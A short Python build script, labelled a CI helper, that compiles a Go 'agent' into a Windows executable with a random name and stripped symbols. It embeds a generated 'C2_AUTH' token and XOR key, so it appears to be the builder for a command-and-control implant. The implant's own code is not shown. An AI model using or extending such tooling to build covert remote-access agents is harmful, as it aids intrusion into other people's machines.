#!/usr/bin/env python3
"""CI helper to build a Windows agent binary at build/agent_*.exe."""

from __future__ import annotations

import argparse
import hashlib
import os
import random
import secrets
import string
import subprocess
import sys
from pathlib import Path


def _random_id(length: int = 8) -> str:
    return "".join(random.choices(string.hexdigits.lower(), k=length))


def main() -> int:
    parser = argparse.ArgumentParser(description="Build agent binary for CI")
    parser.add_argument("--output-dir", "-o", default="build")
    parser.add_argument("--os", default="windows")
    parser.add_argument("--arch", default="amd64")
    args = parser.parse_args()

    repo_root = Path(__file__).resolve().parent
    agent_dir = repo_root / "agent"

    output_dir = (repo_root / args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    suffix = ".exe" if args.os == "windows" else ""
    binary_path = output_dir / f"agent_{_random_id()}{suffix}"
    c2_auth = secrets.token_hex(32)
    xor_key_hex = secrets.token_hex(32)

    env = os.environ.copy()
    env["GOOS"] = args.os
    env["GOARCH"] = args.arch

    cmd = [
        "go",
        "build",
        "-trimpath",
        "-ldflags",
        f"-s -w -X main.C2_AUTH={c2_auth} -X main.xorKeyHex={xor_key_hex}",
        "-o",
        str(binary_path),
        ".",
    ]

    print(f"[*] Building agent for {args.os}/{args.arch}")
    print(f"[+] C2_AUTH: {c2_auth}")
    print(f"[+] XOR key: {xor_key_hex}")
    result = subprocess.run(cmd, cwd=agent_dir, env=env)
    if result.returncode != 0:
        return result.returncode

    sha256 = hashlib.sha256(binary_path.read_bytes()).hexdigest()
    print(f"[+] SHA-256: {sha256}")
    print(f"[+] Built: {binary_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
